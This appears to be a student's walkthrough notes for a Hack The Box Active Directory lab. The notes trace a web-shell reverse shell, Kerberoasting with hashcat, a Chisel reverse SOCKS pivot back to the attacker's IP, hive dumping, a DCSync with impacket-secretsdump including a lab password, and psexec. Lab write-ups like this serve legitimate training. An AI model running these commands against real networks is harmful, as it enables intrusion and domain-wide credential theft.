Notice, referred to writeups several times for the first few questions and also HTB forum

1. Go to http://IP/uploads/antak.aspx
2. Go to revshell and use the PowerShell Base64 reverse shell
3. Setup `rlwrap nc -nvlp 4242`
4. Paste and run the reverse shell from revshell in the web application
5. nc provides me with a cmd session on the victim machine (initial foothold, calling this victim A)
6. Just needed to go to the Admin's desktop folder to answer question 1
7. For the next question, kerberoasting MSSQLSvc, I brought in PowerView from my attack host to victim A machine. This is done by using setting up a HTTP Server at my attack machine using `python3 -m http.server` and then use `curl` in the revers shell session. (Referred to writeup here, mainly to get the idea of setting up a reverse shell, I initially only focused on the web application).
8. With PowerView, I ran the PowerView commands in my Obsidian Kerberoasting notes. Just followed the instructions there and can get the Kerberos TGS, but one issue, the output at the CLI is cut off. Tried to save it to clipboard, still cut off; tried to save to a text file, still cut off; so I saved it as a CSV file (referred to writeup here, actually already had it in my notes, but didn't try it because in notes, it was for saving for all found users instead of targeted users, should just try it next time).
9. Once gotten the Kerberos TGS for user `svc_sql` (the SAM Account Name for MSSQLSvc), cracked it using `hashcat`.
10. This credential is usable for MS01.inlanefreight.local, but I am not directly connected to it, MS01 IP is 172.16.6.50, victim A IP is 172.16.6.100. So here need to pivot. (Confirmed the idea of pivoting from HTB FORUM, when I was doing I had guessed might needed pivoting but I wasn't motivated to do pivoting, unless really really need to. Checked the writeups, they did pivoting also)
11. To do the pivoting, I use `Chisel`, need to setup reverse pivoting because need to RDP to MS01. So commands are:
- In Kali machine: `sudo chisel server --reverse -v -p 1234 --socks5`
- In victim A: `./chisel.exe client -v 10.10.16.8:1234 R:socks`
- `10.10.16.8` is my Kali HTB VPN IP
- `chisel.exe` is transferred to victim A using the same python HTTP server method
12. Once pivot is set up, used proxychains to RDP into MS01 machine, creds are the one for `svc_sql`.
13. Went to the Administrator's desktop to get the flag.
14. Next question asked for cleartext credentials for another domain user, checked the Users folder, other users consist of lab_adm, tpetty and Administrator (we already ahve Administrator)
15. Tried `LaZagne.exe` but returned no results
16. Since we have admin privileges, tried saving the SAM, SYSTEM, and SECURITY hives, and can save, so saved them then transferred to Kali attack machine (connected the Kali directory to the MS01 via `xfreerdp /drive` feature, basically something like `net use N: \\smb\share`)
17. Cracked the SAM hives, can got a cleartext password, belonged to tpetty.
18. Next question asked what kind of attack can tpetty do, so again, imported PowerView, checked tpetty's ACL (Command in Obsidian Scanning & Enumeration note)
19. tpetty can do DCsync attack
20. Tried mimikatz, failed first time, ran `runas.exe /netonly` with tpetty creds and then tried mimikatz again, still failed. Went back to Kali machine and then used proxychains with impacket-secretsdump and can perform dcsync attack. Command below:
- `proxychains impacket-secretsdump INLANEFREIGHT.LOCAL/tpetty:'Sup3rS3cur3D0m@inU2eR'@DC01.INLANEFREIGHT.LOCAL -just-dc`
- Initially, I put the target domain/IP as MS01, but didn't work, figured out that we're targeting the final machine, which is DC01, so changed the target IP to DC01 and it worked!
- Why I didn't use the IP behind `@` at the impacket-secretsdump command? Because I don't know DC01, so I gambled on the MS01 have DNS entries to resovle the DC01 name to the correct IP address
21. Got a different administrator hash, checked that new administrator hash with `proxychains nxc` and it worked.
22. Check the hash again for rdp, didn't work, so straight go do `impacket-psexec`, got a shell, got the final flag.
